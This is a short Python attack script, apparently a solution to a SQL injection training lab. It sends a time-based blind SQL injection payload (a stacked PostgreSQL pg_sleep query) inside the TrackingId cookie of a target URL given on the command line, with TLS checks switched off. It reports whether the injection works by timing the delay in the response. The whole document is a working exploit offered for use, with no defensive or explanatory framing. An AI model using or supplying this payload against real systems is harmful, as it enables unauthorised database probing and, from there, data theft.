import requests
from requests.utils import dict_from_cookiejar, cookiejar_from_dict
import sys
import concurrent.futures
import urllib3
urllib3.disable_warnings()

def generate_payload(time):
    return f"'%3bSELECT+pg_sleep({time})--"

def update_cookies(session,url,payload,cookies,time):
    cookies=cookies.copy()
    cookies['TrackingId']+=payload
    r=session.get(url,verify=False,timeout=time*2,cookies=cookies)
    return r

def sleep_time(session,cookies,url,time):
    payload=generate_payload(time)
    r=update_cookies(session,url,payload,cookies,time)
    return r.elapsed.total_seconds()

if __name__=='__main__':
    try:
        url=sys.argv[1]
    except IndexError:
        print(f"[-] Syntax: python3 {sys.argv[0]} <url>")
        exit(-1)


s=requests.Session()
r=s.get(url,verify=False,timeout=5)
cookies=dict_from_cookiejar(s.cookies)
print("[+] Sleep for 5s ...")
if sleep_time(s,cookies,url,5)>5:
    print("work")
else:
    print("Failed")